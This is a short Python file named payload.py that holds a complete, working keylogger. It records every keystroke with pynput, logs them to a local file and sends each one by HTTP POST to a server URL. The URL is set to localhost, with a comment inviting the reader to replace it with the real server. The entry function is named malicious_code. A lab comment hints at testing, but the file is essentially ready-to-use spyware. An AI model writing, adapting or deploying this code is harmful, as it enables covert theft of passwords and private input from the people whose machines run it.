# payload.py
from pynput.keyboard import Key, Listener
import logging
import requests
import time

# Local log file configuration
log_file = "keylog.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Server URL for sending keystrokes (for testing purposes, ensure this is correctly set up in your lab)
server_url = "http://127.0.0.1:80/keylog"  # Replace with actual server URL if applicable

# Function to send key logs to a remote server
def send_to_server(data):
    try:
        # Send a POST request with the keystroke data
        requests.post(server_url, data={'key': data})
    except requests.RequestException as e:
        # Log error if server is unreachable or any request error occurs
        logging.error(f"Failed to send data to server: {e}")

# Function to log the keys pressed locally and send them to the server
def on_press(key):
    try:
        # Log regular alphanumeric keys
        log_entry = f"Key pressed: {key.char}"
    except AttributeError:
        # Handle special keys (e.g., Shift, Enter, etc.)
        log_entry = f"Special key pressed: {key}"

    # Log locally
    logging.info(log_entry)

    # Send to server
    send_to_server(log_entry)

# Define the malicious code function to start the keylogger
def malicious_code():
    print("Malicious code executed. Keylogger started.")
    # Start listening to keyboard events indefinitely
    with Listener(on_press=on_press) as listener:
        listener.join()  # Keeps the listener active

# Run the malicious code
if __name__ == "__main__":
    malicious_code()
